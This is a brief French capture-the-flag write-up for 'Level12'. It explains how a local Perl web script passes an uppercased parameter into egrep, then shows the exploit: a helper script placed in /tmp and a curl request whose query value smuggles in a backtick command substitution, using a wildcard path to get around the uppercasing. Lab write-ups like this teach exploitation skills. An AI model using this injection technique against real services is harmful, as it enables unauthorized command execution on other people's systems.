# Level12

---

- Nous avons un script perl dans le home.

- En analysant le regex, on observe que le parametre seras mis en majuscules et tout les characteres suivant le premier espace (inclus) serons supprimer.

- La string transformee passe ensuite dans un egrep que l'on vas par la suite exploiter.

- Nous devons ensuite creer un script dans le /tmp/SCRIPT:
```bash
#!/bin/bash
getflag > /tmp/flag
```

```bash
chmod +x /tmp/SCRIPT
```


- On execute la commande: 

```bash
curl localhost:4646?x='`/*/SCRIPT`'
```

- Puis on lis le ficher /tmp/flag.